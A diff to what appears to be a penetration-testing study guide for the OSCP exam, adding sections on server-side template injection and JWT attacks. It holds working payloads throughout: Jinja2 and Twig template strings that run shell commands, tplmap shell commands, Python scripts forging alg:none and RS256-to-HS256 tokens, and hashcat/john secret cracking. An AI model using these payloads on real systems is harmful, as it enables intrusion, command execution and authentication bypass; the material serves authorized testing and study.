@@ -4,7 +4,7 @@
 authorization to test the target.*
 
 *Scope note: this file covers the manual detection/exploitation methodology for the core OWASP-class
-web vulnerabilities (SQLi, XSS, LFI/RFI, command injection, SSRF, XXE) — the "find and confirm it by hand"
+web vulnerabilities (SQLi, XSS, LFI/RFI, command injection, SSRF, XXE, SSTI, JWT attacks) — the "find and confirm it by hand"
 step that sits **before** automation. For sqlmap tamper-script usage and shell escalation once an
 injection point is already found, see [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation).
 For file-upload bypass, deserialization, and WordPress/CMS attack techniques, see the rest of
@@ -350,6 +350,183 @@ Look for XXE in any endpoint that accepts XML directly, but also in formats that
 
 ---
 
+## 7. Server-Side Template Injection (SSTI)
+
+### 7.1 Detection
+**Explanation:** SSTI occurs when user input is concatenated into a server-side template string and re-rendered by the template engine, rather than passed in as inert data. Test every reflected input point (params, form fields, headers, filenames) with a generic polyglot first, then narrow with per-engine math probes. If `49` appears in the response, the expression was evaluated server-side (confirmed SSTI); if the literal payload is reflected unchanged, you're looking at XSS or no injection instead.
+
+**Example payloads:**
+```
+${{<%[%'"}}%\.        # generic polyglot — throws distinct errors per engine, useful as a first probe
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+${{7*7}}
+```
+`49` in the response body = template evaluation confirmed. The literal string reflected back unchanged = not SSTI (check for XSS instead).
+
+**Reference:** https://portswigger.net/web-security/server-side-template-injection
+
+---
+
+### 7.2 Engine Fingerprinting
+**Explanation:** Once a probe fires, narrow down the specific engine before picking an exploitation chain — payload syntax is engine-specific and a wrong guess wastes time. Use the table below as a quick decision aid; walk PortSwigger's full decision tree (referenced below) for edge cases.
+
+| Probe that fires | Likely engine(s) | Disambiguation |
+|---|---|---|
+| `{{7*7}}` → `49` | Jinja2 (Python/Flask), Twig (PHP) | `{{7*'7'}}` → `7777777` (string repetition) = Jinja2; → `49` or a type error = Twig |
+| `${7*7}` → `49` | FreeMarker (Java) | `<#assign x=7*7>${x}` also works only on FreeMarker |
+| `${7*7}` → `49` (Velocity) | Velocity (Java) | Velocity is more reliable via `#set($x=7*7)$x` than the bare `${}` probe |
+| `<%= 7*7 %>` → `49` | ERB (Ruby/Rails) | — |
+| `#{7*7}` → `49` | Java EL/JSF-style `#{}` contexts | — |
+| `${{7*7}}` → `49` | Rare doubly-wrapped EL-in-template contexts | — |
+| Math probes inert; `{$smarty.version}` leaks a version string | Smarty (PHP) | Confirm further with `{php}echo 7*7;{/php}` if `{php}` tags aren't disabled |
+| `{{...}}` only resolves registered helpers, no arithmetic | Handlebars (JS) | Logic-less by design — **not** generally exploitable to RCE via SSTI the way the engines above are |
+
+**Reference:** https://portswigger.net/web-security/server-side-template-injection#identifying-template-injection-vulnerabilities
+
+---
+
+### 7.3 Exploitation to RCE — Jinja2 (Python/Flask)
+**Explanation:** Jinja2 templates execute inside the Flask app's own Python interpreter, so a confirmed injection lets you walk Python's object graph (`__class__`, `__mro__`, `__globals__`, `__builtins__`) from any object literal back to `os`/`subprocess` and get command execution. Check `{{config}}` first — Flask's global config object often dumps `SECRET_KEY` and other secrets on its own, a low-risk win before attempting RCE.
+
+**Example payloads:**
+```
+{{config}}                                                                       # Flask config dump (SECRET_KEY, DB creds, etc.) — try before going for RCE
+{{7*7}}                                                                          # confirm — 49
+{{self.__init__.__globals__.__builtins__}}                                       # confirm builtins are reachable (unsandboxed environment)
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}   # classic one-liner RCE
+{{ ''.__class__.__mro__[1].__subclasses__() }}                                   # if self/config are blocked: enumerate loaded subclasses to find e.g. subprocess.Popen
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}   # INDEX = the subprocess.Popen (or similar) index from the enumeration above
+```
+The exact working gadget depends on the Jinja2 version and whether the app uses a plain `Environment` (unsandboxed, classic one-liner works directly) or `jinja2.sandbox.SandboxedEnvironment` (blocks direct `__builtins__` access — fall back to the subclass-enumeration chain, and expect the subclass index to vary per target). If neither classic payload fires cleanly, use tplmap (§7.5) to search for the right gadget/index automatically.
+
+**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html
+
+---
+
+### 7.4 Exploitation to RCE — Twig (PHP)
+**Explanation:** Twig runs inside the PHP process. An unsandboxed Twig environment (raw framework usage without `Twig\Sandbox\SecurityPolicy`) allows registering an arbitrary PHP function as a filter callback and immediately invoking it — direct RCE. Many CMS/page-builder integrations wrap Twig in a sandbox that whitelists filters/functions, which blocks this directly and requires an app-specific sandbox-escape gadget instead.
+
+**Example payloads:**
+```
+{{7*7}}                                                                          # confirm — 49
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}   # classic unsandboxed RCE — registers exec() as the fallback filter, then calls it
+{{['id']|filter('system')}}                                                      # shorter modern equivalent — maps the array through system() as the filter callback
+```
+If `registerUndefinedFilterCallback`/`getFilter` throws a `Twig\Sandbox\SecurityError` (filter/method not allowed), the environment is sandboxed — direct RCE is blocked and you need a sandbox-escape gadget specific to that CMS/framework version rather than expecting the payload above to work as-is.
+
+**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#twig-php
+
+---
+
+### 7.5 Automation (tplmap)
+**Explanation:** As with sqlmap (§1.1), confirm SSTI by hand first — it's the expected exam methodology and avoids relying on a scanner as ground truth. Once confirmed (and optionally fingerprinted per §7.2), [tplmap](https://github.com/epinna/tplmap) automates engine identification and searches for a working RCE payload/gadget chain across engines, saving time versus manually enumerating `__subclasses__()` indexes or sandbox-escape gadgets by hand. Detection/identification (no `-u ... ` alone beyond confirming injection and engine) is fine; `--os-shell`/`--os-cmd`/`--bind-shell`/`--reverse-shell` are tplmap's fully-automated exploit-to-shell flags and carry the same exam restriction as sqlmap's `--os-shell` (§5 in `web-attack-techniques.md`) — treat them as reference-only.
+
+**Example:**
+```bash
+tplmap.py -u 'http://target/page?name=John'                  # detect + fingerprint engine — exam-safe
+tplmap.py -u 'http://target/page?name=John' --os-shell        # BANNED on OSCP exam — fully-automated OS-shell spawning, reference-only
+tplmap.py -u 'http://target/page?name=John' --os-cmd id       # BANNED on OSCP exam — same restriction
+```
+**Exam caveat:** once tplmap confirms the injection point and engine, hand-craft the RCE payload from §7.3/§7.4 (or the engine-appropriate gadget) yourself rather than letting `--os-shell`/`--os-cmd` automate exploitation end-to-end.
+
+**Reference:** https://github.com/epinna/tplmap
+
+---
+
+## 8. JWT (JSON Web Token) Attacks
+
+### 8.1 alg:none Signature Bypass
+**Explanation:** A JWT is three base64url segments — `header.payload.signature`. Some libraries/apps trust the attacker-controlled `alg` field in the header instead of enforcing a fixed algorithm allowlist server-side. Setting `alg` to `none` and stripping the signature entirely produces a token some servers accept as validly "signed," since `none` is a legal (if dangerous) value per the JWS spec. Forge whatever claims you want (`"role":"admin"`, a different `"user"`) before re-encoding.
+
+**Example payloads:**
+```bash
+# Inspect the existing header/payload segments first
+echo '<header_b64url>' | base64 -d 2>/dev/null; echo
+echo '<payload_b64url>' | base64 -d 2>/dev/null; echo
+```
+```python
+import base64, json
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+payload = b64url(json.dumps({"user": "admin", "role": "admin"}).encode())  # forge claims as needed
+print(f"{header}.{payload}.")   # trailing dot — empty signature segment
+```
+If plain `none` is rejected, try case variants some parsers still accept (`None`, `NONE`, `nOnE`) and both an empty-but-present signature segment (`header.payload.`) and one omitted entirely (`header.payload`).
+
+**Reference:** https://portswigger.net/web-security/jwt/algorithm-confusion · https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
+
+---
+
+### 8.2 Weak HMAC Secret Brute-Forcing
+**Explanation:** HS256/HS384/HS512-signed tokens are only as strong as the shared secret. If the app uses a short/default/wordlist-guessable secret, cracking it offline lets you forge arbitrary valid tokens (admin claims, extended expiry, etc.) with no further server interaction.
+
+**Example:**
+```bash
+# hashcat: mode 16500 = JWT (JSON Web Token) — hashes header.payload with each wordlist
+# candidate as the HMAC key and compares against the signature segment
+hashcat -a 0 -m 16500 '<header>.<payload>.<signature>' /usr/share/wordlists/rockyou.txt
+
+# john: convert to a crackable format first (jwt2john.py ships under /usr/share/john/ on Kali)
+python3 /usr/share/john/jwt2john.py '<jwt>' > jwt.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt jwt.hash
+john --show jwt.hash
+
+# jwt_tool: built-in dictionary crack
+python3 jwt_tool.py '<jwt>' -C -d /usr/share/wordlists/rockyou.txt
+```
+Once cracked, re-sign forged claims with the recovered secret — `jwt_tool.py '<jwt>' -T` to tamper interactively, or directly with PyJWT: `jwt.encode(claims, secret, algorithm="HS256")`.
+
+**Reference:** https://github.com/hashcat/hashcat/issues/1057 · https://github.com/ticarpi/jwt_tool
+
+---
+
+### 8.3 RS256-to-HS256 Key Confusion
+**Explanation:** Some JWT libraries pass whatever "key" is configured straight into the same verification call regardless of the algorithm named in the token. If a server issues RS256 tokens (asymmetric — private key signs, public key verifies) but doesn't strictly enforce that incoming tokens' `alg` header must be RS256, an attacker who knows the RSA **public** key can switch `alg` to `HS256` and sign a forged token using that public key's raw bytes as the HMAC secret. The server then "verifies" with the same public key — but treats it as a symmetric HMAC secret, which succeeds because the attacker generated the signature the exact same way.
+
+**Example — obtain the RSA public key:**
+```bash
+curl -s http://target/.well-known/jwks.json                    # JWKS endpoint, if exposed
+curl -s http://target/certs/public.pem                          # sometimes published directly
+openssl x509 -in server-cert.pem -pubkey -noout > pubkey.pem     # derive from an exposed TLS/signing cert
+```
+**Example — forge an HS256 token using the public key as the HMAC secret (PyJWT):**
+```python
+import jwt
+
+with open("pubkey.pem", "rb") as f:
+    public_key = f.read()          # exact bytes matter, including any trailing newline
+
+forged = jwt.encode({"user": "admin", "role": "admin"}, public_key, algorithm="HS256")
+print(forged)
+```
+Send `forged` in place of the original token (`Authorization: Bearer <forged>`).
+
+**Reference:** https://portswigger.net/web-security/jwt/algorithm-confusion · https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
+
+---
+
+### 8.4 jwt_tool — Automating the Above
+**Explanation:** Once the manual mechanics in §8.1–§8.3 are understood, [jwt_tool](https://github.com/ticarpi/jwt_tool) automates detection and exploitation of all three (plus header-injection variants like `jku`/`kid` SQLi/path-traversal) against a live token/endpoint in one pass — the practical Swiss-army-knife once you know what each check is actually doing under the hood.
+
+**Example:**
+```bash
+python3 jwt_tool.py '<jwt>' -t http://target/api/endpoint -rh "Authorization: Bearer <jwt>" -M pb   # playbook scan — runs the known checks (alg:none, weak secret, etc.) live
+python3 jwt_tool.py '<jwt>' -X a                        # alg:none exploit — auto-generates the unsigned variant (§8.1)
+python3 jwt_tool.py '<jwt>' -X k -pk pubkey.pem         # RS256->HS256 key-confusion exploit (§8.3)
+python3 jwt_tool.py '<jwt>' -C -d rockyou.txt           # HMAC secret dictionary crack (§8.2)
+python3 jwt_tool.py '<jwt>' -T                          # interactive claim tampering + re-signing once you have a secret/key
+```
+
+**Reference:** https://github.com/ticarpi/jwt_tool · https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool
+
+---
+
 ### Consolidated Reference List
 - SQL Injection (index): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md
 - SQL Injection (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
@@ -358,4 +535,12 @@ Look for XXE in any endpoint that accepts XML directly, but also in formats that
 - Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
 - SSRF (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
 - XXE (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/xxe-xml-external-entity/index.html
+- SSTI (PortSwigger): https://portswigger.net/web-security/server-side-template-injection
+- SSTI Jinja2 (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html
+- SSTI general/Twig (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
+- SSTI automation — tplmap: https://github.com/epinna/tplmap
+- JWT attacks (PortSwigger): https://portswigger.net/web-security/jwt/algorithm-confusion
+- JWT attacks (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
+- JWT cracking (hashcat mode 16500 issue thread): https://github.com/hashcat/hashcat/issues/1057
+- jwt_tool: https://github.com/ticarpi/jwt_tool
 - sqlmap automation (this repo): [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation)
